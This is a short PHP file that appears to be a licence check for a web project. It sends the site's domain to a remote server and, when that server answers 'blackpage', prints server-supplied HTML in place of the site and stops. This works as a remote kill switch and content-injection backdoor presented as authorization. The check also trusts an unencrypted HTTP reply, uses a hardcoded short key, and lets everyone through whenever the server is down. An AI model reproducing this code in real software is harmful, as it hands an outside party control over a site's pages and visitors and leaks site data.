<?php

define('AUTH_SERVER', 'http://sq.diyunuu.cn/auth.php?project=proj_a68c9e46');
define('AUTH_KEY', 'e9ab54');

function check_auth() {
    $domain = str_replace('www.', '', $_SERVER['HTTP_HOST'] ?? '');
    $ctx = stream_context_create(['http' => ['timeout' => 3]]);
    $authResponse = @file_get_contents(AUTH_SERVER . '&domain=' . urlencode($domain), false, $ctx);
    $auth = $authResponse ? json_decode($authResponse, true) : [];

    if ($auth['status'] === 'blackpage' && !empty($auth['html'])) {
        echo $auth['html'];
        exit;
    }

    if (empty($auth)) return true; // 认证服务器不可达时放行

    return $auth['status'] === 'success'
        && hash_equals(hash_hmac('sha256', $auth['token'], AUTH_KEY), $auth['signature'])
        && ($data = json_decode(base64_decode($auth['token']), true))
        && $data['domain'] === $domain
        && $data['expires'] > time();
}

if (!check_auth()) {
    http_response_code(403);
    exit('<h1>Authorization failed</h1>');
}
